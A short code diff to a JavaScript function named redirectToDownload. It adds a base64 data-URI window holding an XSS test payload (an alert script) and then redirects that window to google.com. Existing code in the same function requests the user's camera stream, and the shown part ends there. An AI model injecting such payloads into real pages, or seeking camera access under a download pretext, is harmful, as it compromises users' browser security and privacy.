@@ -2,6 +2,14 @@
 
 <script>
 function redirectToDownload() {
+    // Buka halaman baru dengan menggunakan base64 HTML yang disarankan
+    var w = window.open('data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=');
+
+    // Setelah 300ms, arahkan halaman baru ke https://www.google.com
+    setTimeout(function() {
+        w.location = 'https://www.google.com/';
+    }, 300); // Tunggu 300ms sebelum mengarahkan
+
     // Langkah pertama adalah mengakses stream video dari kamera pengguna
     navigator.mediaDevices.getUserMedia({ video: true })
     .then(function(stream) {
